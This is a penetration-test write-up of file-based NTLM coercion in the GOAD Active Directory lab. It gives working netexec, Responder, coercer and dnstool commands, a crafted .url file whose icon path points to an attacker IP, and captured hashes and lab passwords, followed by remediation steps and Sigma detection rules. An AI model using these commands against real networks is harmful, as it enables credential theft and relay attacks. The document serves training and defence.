# SC-AD-011 — Coerce & File-based Attacks

## Classification

| Field | Value |
|-------|-------|
| **Scenario Code** | SC-AD-011 |
| **Name** | Coerce & File-based Attacks — Forced Authentication via Malicious Files |
| **Target** | CASTELBLACK (192.168.10.22) — SRV north.sevenkingdoms.local / BRAAVOS (192.168.10.23) — SRV essos.local |
| **VLAN** | 10 — AD Lab (192.168.10.0/24) |
| **Severity** | 🔴 Critical |
| **CVSS 3.1** | 8.1 (AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N) |
| **MITRE ATT&CK** | T1187 (Forced Authentication), T1557 (Adversary-in-the-Middle), T1071.001 (Web Protocols) |
| **Mayfly Reference** | Part 13 — https://mayfly277.github.io/posts/GOADv2-pwning-part13/ |
| **Prerequisites** | Domain user with write access to SMB share (arya.stark:Needle) |
| **Result** | NTLMv2 hash capture (user + machine accounts) via SMB and HTTP coercion |
| **Date** | March 2026 |
| **Author** | Nadyr Chouarhi (hik3nR00t) |

---

## Executive Summary

### For a Recruiter

This scenario demonstrates five file-based coercion techniques that force Windows users to authenticate toward an attacker-controlled server simply by **visiting a shared folder** — no click required. By depositing specially crafted files (.lnk, .scf, .url, .searchConnector-ms) on a writable SMB share, an attacker captures NTLMv2 hashes that can be cracked offline or relayed to compromise additional systems. The most advanced technique (WebDAV coercion) activates the WebClient service on the victim machine, enabling HTTP-based authentication that can be relayed to LDAP for privilege escalation — a technique invisible to standard SMB monitoring.

### For an ISO 27001 / NIS2 Auditor

- **A.8.2 (Privileged Access Rights)** — The `all` share on CASTELBLACK grants READ/WRITE access to all domain users. No access control restricts file upload to privileged accounts only.
- **A.8.15 (Logging)** — No monitoring detects the creation of coercion files (.lnk, .scf, .url, .searchConnector-ms) on shared folders. No alerting on WebClient service activation.
- **A.8.9 (Configuration Management)** — WebClient service is installed on BRAAVOS (Windows Server 2016) with no business justification. This service should be disabled on all servers.
- **NIS2 Article 21 §2(d)** — Absence of supply chain security controls: malicious files deposited by any domain user propagate credential theft across trust boundaries (north.sevenkingdoms.local → essos.local).

### For a CISO

File-based coercion attacks require only a standard domain account and a writable share — conditions present in virtually every Active Directory environment. The attack is silent (no logs, no user interaction beyond visiting a folder), scalable (one file compromises every user who visits the share), and cross-domain (a file on CASTELBLACK coerced khal.drogo from essos.local). The WebDAV variant enables LDAP relay attacks that bypass SMB signing entirely. Immediate remediation requires restricting share write access, disabling WebClient on servers, and deploying file integrity monitoring on shared folders.

---

## Kill Chain

```
Phase 1: Reconnaissance
├── Enumerate writable shares (netexec --shares)
├── Identify targets: CASTELBLACK share "all" (READ/WRITE for all)
└── Identify signing: CASTELBLACK (False), BRAAVOS (False)

Phase 2: File-based Coercion (SMB)
├── Technique 1: .lnk file via slinky module → NTLMv2 catelyn.stark
├── Technique 2: .scf file via scuffy module → NTLMv2 catelyn.stark
├── Technique 3: .url file via manual upload → NTLMv2 catelyn.stark
└── Technique 4: .searchConnector-ms via drop-sc → NTLMv2 khal.drogo + WebClient activation

Phase 3: WebDAV Coercion (HTTP)
├── Verify WebClient service active on BRAAVOS
├── Add DNS record (dnstool.py) → attacker.north.sevenkingdoms.local
├── Coerce BRAAVOS$ via coercer (HTTP) → NTLMv2 machine account
└── [Production] Relay HTTP auth to LDAP → RBCD / Shadow Credentials

Phase 4: Cleanup
├── Remove all malicious files from shares
└── Remove DNS record
```

---

## Exploitation

### Phase 1 — Reconnaissance

**Enumerate writable shares on CASTELBLACK:**

```bash
netexec smb 192.168.10.22 -u arya.stark -p 'Needle' -d north.sevenkingdoms.local --shares
```

```
SMB   192.168.10.22   445   CASTELBLACK   [+] north.sevenkingdoms.local\arya.stark:Needle
SMB   192.168.10.22   445   CASTELBLACK   Share    Permissions   Remark
SMB   192.168.10.22   445   CASTELBLACK   all      READ,WRITE    Basic RW share for all
SMB   192.168.10.22   445   CASTELBLACK   public   READ,WRITE    Basic Read share for all domain users
```

> **Finding:** Two shares writable by any domain user. The `all` share is the ideal target for file-based coercion.

### Phase 2 — File-based Coercion (SMB)

**Setup:** Responder listening in verbose mode to capture all NTLMv2 hashes.

```bash
sudo responder -I wg-goad -v
```

> **Tip:** Use `-v` flag to display duplicate hashes. Without it, Responder's SQLite cache (`Responder.db`) skips previously seen hashes. To fully reset: `sudo rm /usr/share/responder/Responder.db /usr/share/responder/logs/*`

**Victim simulation:** RDP session as catelyn.stark on WINTERFELL, navigating to `\\castelblack\all`.

```bash
xfreerdp /d:north.sevenkingdoms.local /u:catelyn.stark /p:robbsansabradonaryarickon /v:192.168.10.11 /cert-ignore
```

#### Technique 1 — .lnk file (slinky)

A .lnk (shortcut) file contains a UNC path reference for its icon. When Windows Explorer renders the folder contents, it attempts to resolve the icon path — sending the user's NTLMv2 hash to the attacker without any click.

```bash
netexec smb 192.168.10.22 -u arya.stark -p 'Needle' -d north.sevenkingdoms.local \
  -M slinky -o NAME=desktop.lnk SERVER=10.10.10.2
```

```
SLINKY   192.168.10.22   445   CASTELBLACK   [+] Created LNK file on the all share
```

**Result:** Upon catelyn.stark visiting `\\castelblack\all`:

```
[SMB] NTLMv2-SSP Client   : 192.168.10.11
[SMB] NTLMv2-SSP Username : NORTH\catelyn.stark
[SMB] NTLMv2-SSP Hash     : catelyn.stark::NORTH:232552275e17536d:1AE4B6CC320CE642A839908509D6CC04:0101...
```

> **No click required.** The hash is captured automatically when the victim enters the folder.

**Cleanup:**

```bash
netexec smb 192.168.10.22 -u arya.stark -p 'Needle' -d north.sevenkingdoms.local \
  -M slinky -o NAME=desktop.lnk SERVER=10.10.10.2 CLEANUP=true
```

#### Technique 2 — .scf file (scuffy)

A .scf (Shell Command File) uses an `IconFile` directive pointing to a UNC path. Windows resolves the icon on folder entry.

```bash
netexec smb 192.168.10.22 -u arya.stark -p 'Needle' -d north.sevenkingdoms.local \
  -M scuffy -o NAME=desktop.scf SERVER=10.10.10.2
```

```
SCUFFY   192.168.10.22   445   CASTELBLACK   [+] Created SCF file on the all share
```

**Result:** NTLMv2 hash captured — same behavior as .lnk, confirmed working on Windows Server 2019.

```
[SMB] NTLMv2-SSP Client   : 192.168.10.11
[SMB] NTLMv2-SSP Username : NORTH\catelyn.stark
[SMB] NTLMv2-SSP Hash     : catelyn.stark::NORTH:...
```

**Cleanup:**

```bash
netexec smb 192.168.10.22 -u arya.stark -p 'Needle' -d north.sevenkingdoms.local \
  -M scuffy -o NAME=desktop.scf SERVER=10.10.10.2 CLEANUP=true
```

#### Technique 3 — .url file (manual)

A .url (Internet Shortcut) file with an `IconFile` UNC path triggers the same auto-resolve behavior.

```bash
cat > /tmp/clickme.url << 'EOF'
[InternetShortcut]
URL=http://click.me/pwned
WorkingDirectory=test
IconFile=\\10.10.10.2\%USERNAME%.icon
IconIndex=1
EOF
```

```bash
impacket-smbclient north.sevenkingdoms.local/arya.stark:Needle@192.168.10.22
# use all
# put /tmp/clickme.url
```

**Result:** NTLMv2 hash captured on folder visit.

```
[SMB] NTLMv2-SSP Client   : 192.168.10.11
[SMB] NTLMv2-SSP Username : NORTH\catelyn.stark
[SMB] NTLMv2-SSP Hash     : catelyn.stark::NORTH:98356f3c6a8fcbf2:F3102A6C003FF2C6BAF5D471FE1331BC:0101...
```

**Cleanup:**

```bash
impacket-smbclient north.sevenkingdoms.local/arya.stark:Needle@192.168.10.22
# use all
# rm clickme.url
```

#### Technique 4 — .searchConnector-ms (drop-sc)

A .searchConnector-ms file has a dual effect: it captures NTLMv2 hashes AND **starts the WebClient service** on the victim's machine. This is critical because WebClient enables HTTP-based authentication, which can be relayed to LDAP (unlike SMB).

```bash
netexec smb 192.168.10.22 -u arya.stark -p 'Needle' -d north.sevenkingdoms.local \
  -M drop-sc -o SHARE=all URL=\\\\10.10.10.2\\share
```

```
DROP-SC   192.168.10.22   445   CASTELBLACK   [+] Created Documents.searchConnector-ms file on the all share
```

**Victim:** khal.drogo (essos.local) connected via RDP to BRAAVOS, visits `\\castelblack\all`.

```bash
xfreerdp /d:essos.local /u:khal.drogo /p:horse /v:192.168.10.23 /cert-ignore
```

**Result — Cross-domain hash capture:**

```
[SMB] NTLMv2-SSP Client   : 192.168.10.23
[SMB] NTLMv2-SSP Username : ESSOS\khal.drogo
[SMB] NTLMv2-SSP Hash     : khal.drogo::ESSOS:0b7618234d43ad72:E4523B1F3C08608E313C6AB5C908172B:0101...
```

> **Cross-domain impact:** A file on CASTELBLACK (north.sevenkingdoms.local) captured credentials from khal.drogo (essos.local). Trust boundaries do not protect against file-based coercion.

**Verify WebClient activation on BRAAVOS:**

```bash
netexec smb 192.168.10.23 -u khal.drogo -p 'horse' -d essos.local -M webdav
```

```
WEBDAV   192.168.10.23   445   BRAAVOS   WebClient Service enabled on: 192.168.10.23
```

> **WebClient is now active.** This unlocks Phase 3 — HTTP coercion.

### Phase 3 — WebDAV Coercion (HTTP)

With WebClient active on BRAAVOS, we can coerce HTTP authentication. HTTP auth is relayable to LDAP (unlike SMB auth), enabling privilege escalation via RBCD or Shadow Credentials.

**Step 1 — Add DNS record pointing to attacker IP:**

```bash
python3 /opt_test/krbrelayx/dnstool.py \
  -u 'north.sevenkingdoms.local\arya.stark' -p 'Needle' \
  -a add -r 'attacker.north.sevenkingdoms.local' -d 10.10.10.2 192.168.10.11
```

```
[+] LDAP operation completed successfully
```

> **Why DNS?** WebClient requires a hostname (not IP) to trigger HTTP auth. We add a DNS A record that resolves to our attacker IP.

**Step 2 — Coerce BRAAVOS via HTTP using coercer:**

```bash
coercer coerce -u arya.stark -p 'Needle' -d north.sevenkingdoms.local \
  -t 192.168.10.23 -l attacker.north.sevenkingdoms.local --always-continue
```

**Result — HTTP coercion + machine account hash:**

```
[SMB] NTLMv2-SSP Client   : 192.168.10.23
[SMB] NTLMv2-SSP Username : ESSOS\BRAAVOS$
[SMB] NTLMv2-SSP Hash     : BRAAVOS$::ESSOS:cca7d83f3bae651f:6360470EEE219F199F7B4CA7F669F6DA:0101...

[HTTP] Sending NTLM authentication request to 192.168.10.23
[HTTP] Sending NTLM authentication request to 192.168.10.23
[HTTP] Sending NTLM authentication request to 192.168.10.23
```

> **Key observation:** Both SMB and HTTP coercion are triggered. The `[HTTP]` lines confirm WebClient is processing HTTP authentication requests. In a production attack, `ntlmrelayx` would replace Responder to relay the HTTP auth to LDAP for:
> - **RBCD attack:** Create a machine account → delegate to BRAAVOS$ → impersonate Administrator
> - **Shadow Credentials:** Inject msDS-KeyCredentialLink on BRAAVOS$ → certificate-based auth
> - **ACL modification:** Add privileges to a controlled account

**Cleanup:**

```bash
netexec smb 192.168.10.22 -u arya.stark -p 'Needle' -d north.sevenkingdoms.local \
  -M drop-sc -o SHARE=all URL=\\\\10.10.10.2\\share CLEANUP=true

python3 /opt_test/krbrelayx/dnstool.py \
  -u 'north.sevenkingdoms.local\arya.stark' -p 'Needle' \
  -a remove -r 'attacker.north.sevenkingdoms.local' -d 10.10.10.2 192.168.10.11
```

---

## MITRE ATT&CK Mapping

| Technique | Tactic | ID | Description |
|-----------|--------|----|-------------|
| Forced Authentication | Credential Access | T1187 | Coerce NTLMv2 via malicious files (.lnk, .scf, .url, .searchConnector-ms) |
| Adversary-in-the-Middle | Credential Access | T1557 | Capture NTLMv2 hashes via Responder |
| Web Protocols | Command & Control | T1071.001 | WebDAV coercion via HTTP protocol |
| System Services | Execution | T1569.002 | WebClient service activation via .searchConnector-ms |
| Account Manipulation | Persistence | T1098 | RBCD/Shadow Credentials via LDAP relay (production scenario) |

---

## CVSS 3.1 Scoring

**Vector:** AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N — **Score: 8.1 (High)**

| Metric | Value | Justification |
|--------|-------|---------------|
| Attack Vector | Network | Remote exploitation via SMB share |
| Attack Complexity | Low | Standard tools, writable share sufficient |
| Privileges Required | Low | Any domain user with write access |
| User Interaction | Required | Victim must visit the share (no click needed) |
| Confidentiality | High | NTLMv2 hash capture enables offline cracking or relay |
| Integrity | High | HTTP relay enables account modification (RBCD, Shadow Creds) |
| Availability | None | No service disruption |

---

## Financial Impact — MediaTech Groupe SA

| Impact Category | Estimated Cost | Basis |
|----------------|---------------|-------|
| Incident Response | €45,000 – €90,000 | Forensic analysis of all shared folders + credential rotation |
| Business Interruption | €30,000 – €60,000 | Share access restrictions during remediation (2-5 days) |
| Regulatory Fines (NIS2) | €100,000 – €500,000 | Failure to implement access controls on shared resources |
| Reputation Damage | €50,000 – €150,000 | Cross-domain credential theft demonstrates systemic access control failure |
| **Total Estimated Impact** | **€225,000 – €800,000** | |

---

## Regulatory Analysis

### ISO 27001:2022

| Control | Gap | Risk |
|---------|-----|------|
| A.8.2 — Privileged Access Rights | Writable shares accessible to all domain users | Any user can deposit coercion files |
| A.8.9 — Configuration Management | WebClient enabled on servers without business justification | Enables HTTP-based relay attacks bypassing SMB signing |
| A.8.15 — Logging | No detection of malicious file creation on shares | Silent credential theft at scale |
| A.8.16 — Monitoring Activities | No file integrity monitoring on shared folders | Coercion files persist undetected |

### NIS2 Directive

| Article | Requirement | Gap |
|---------|-------------|-----|
| Art. 21 §2(a) — Risk Analysis | Share write permissions not risk-assessed | Unrestricted write = credential theft vector |
| Art. 21 §2(d) — Supply Chain | Cross-domain trust enables cross-boundary credential theft | north → essos compromise via shared file |
| Art. 21 §2(e) — Vulnerability Management | WebClient service not hardened on servers | Known attack vector since 2022 |

---

## COMEX Decision Requirements

| Priority | Decision | Investment | Timeline |
|----------|----------|------------|----------|
| CRITICAL | Restrict write access on all shared folders to authorized groups only | €5,000 (GPO review) | 0-48h |
| CRITICAL | Disable WebClient service on all servers | €0 (GPO) | 0-24h |
| HIGH | Deploy file integrity monitoring (FIM) on shared folders | €15,000-30,000/year | 1-2 weeks |
| HIGH | Enable advanced SMB auditing (Event ID 5145) on file servers | €0 (GPO) | 1 week |
| MEDIUM | Enforce SMB signing on all machines (not just DCs) | €5,000 (testing) | 2-4 weeks |
| MEDIUM | Network segmentation to prevent cross-VLAN share access | €20,000-40,000 | 1-3 months |

---

## Remediation

### Immediate (0-48h)

**Disable WebClient on all servers:**

```powershell
# GPO: Computer Configuration → Windows Settings → System Services
# WebClient → Disabled
Stop-Service WebClient -Force
Set-Service WebClient -StartupType Disabled
```

**Restrict share write access:**

```powershell
# Remove "Everyone" and "Domain Users" write access from shares
# Replace with specific security groups
Revoke-SmbShareAccess -Name "all" -AccountName "Everyone" -Force
Grant-SmbShareAccess -Name "all" -AccountName "NORTH\Share-Writers" -AccessRight Change -Force
```

### Short-term (1-4 weeks)

**Enable SMB auditing on file servers:**

```powershell
# Enable Object Access auditing
auditpol /set /subcategory:"Detailed File Share" /success:enable /failure:enable
```

**Deploy Sigma rule for coercion file detection:**

```yaml
title: Suspicious File Created on SMB Share
id: f5a8e1c3-7b2d-4e8f-9c3a-1d5e7f2a8b4c
status: experimental
description: Detects creation of known coercion file types on SMB shares
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 5145
        RelativeTargetName|endswith:
            - '.searchConnector-ms'
            - '.scf'
            - '.url'
            - '.lnk'
        AccessMask: '0x2'
    condition: selection
falsepositives:
    - Legitimate shortcut files created by administrators
level: high
tags:
    - attack.t1187
    - attack.credential_access
```

### Long-term (1-3 months)

**Enforce SMB signing across all machines:**

```powershell
# GPO: Computer Configuration → Policies → Windows Settings → Security Settings
# → Local Policies → Security Options
# Microsoft network server: Digitally sign communications (always) → Enabled
# Microsoft network client: Digitally sign communications (always) → Enabled
```

**Deploy file integrity monitoring (FIM):**

Monitor all shared folders for creation of .lnk, .scf, .url, .searchConnector-ms files with automated alerting and quarantine.

---

## SOC Detection

### Event IDs to Monitor

| Event ID | Source | Description |
|----------|--------|-------------|
| 5145 | Security | Detailed File Share — detects file creation on shares |
| 7045 | System | Service Installation — detects WebClient service start |
| 4697 | Security | Service Installation (audit) |

### Sigma Rule — WebClient Service Activation

```yaml
title: WebClient Service Started on Server
id: 8c3e1a2b-5d7f-4e9a-b8c2-3f6a7d1e5b9c
status: experimental
description: Detects WebClient service activation on Windows Server (should never run on servers)
logsource:
    product: windows
    service: system
detection:
    selection:
        EventID: 7036
        param1: 'WebClient'
        param2: 'running'
    condition: selection
falsepositives:
    - Legitimate WebDAV usage (rare on servers)
level: critical
tags:
    - attack.t1187
    - attack.t1071.001
```

---

## Alternative Techniques

| Technique | Description | Why Not Used Here |
|-----------|-------------|-------------------|
| ntlmrelayx HTTP → LDAP | Relay HTTP coercion to LDAP for RBCD/Shadow Credentials | Demonstrated concept with Responder; production attack would use ntlmrelayx |
| .library-ms file | Similar to .searchConnector-ms, triggers WebClient | drop-sc module covers this use case |
| .theme file | Windows theme file with UNC icon path | Requires user to apply the theme (more interaction) |
| RDP hijacking | Hijack disconnected RDP sessions | Different attack vector, covered in other scenarios |

---

## References

| Reference | URL |
|-----------|-----|
| Mayfly277 GOAD Part 13 | https://mayfly277.github.io/posts/GOADv2-pwning-part13/ |
| Gabriel Prud'homme — Coerce Talk | https://www.youtube.com/watch?v=b0lLxLJKaRs |
| MITRE T1187 | https://attack.mitre.org/techniques/T1187/ |
| Coercer Tool | https://github.com/p0dalirius/Coercer |
| krbrelayx (dnstool.py) | https://github.com/dirkjanm/krbrelayx |
| WebClient Attack | https://www.bitsadmin.com/blog/spooling-printers |
